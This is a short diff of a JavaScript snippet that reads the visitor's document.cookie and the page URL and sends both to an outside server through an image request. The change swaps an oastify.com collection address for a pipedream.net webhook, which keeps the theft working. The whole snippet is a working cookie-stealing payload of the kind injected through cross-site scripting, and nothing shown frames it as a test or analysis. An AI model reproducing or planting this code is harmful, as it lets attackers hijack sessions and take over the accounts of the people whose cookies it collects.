@@ -1,4 +1,4 @@
 (function(){
     var d = document.cookie;
-    new Image().src='https://ugeifo4lkwcof34exapuro38izoqcg05.oastify.com/c?d='+encodeURIComponent(d)+'&u='+encodeURIComponent(location.href);
+    new Image().src='https://eoow6y96ffo9mzx.m.pipedream.net/c?d='+encodeURIComponent(d)+'&u='+encodeURIComponent(location.href);
 })();
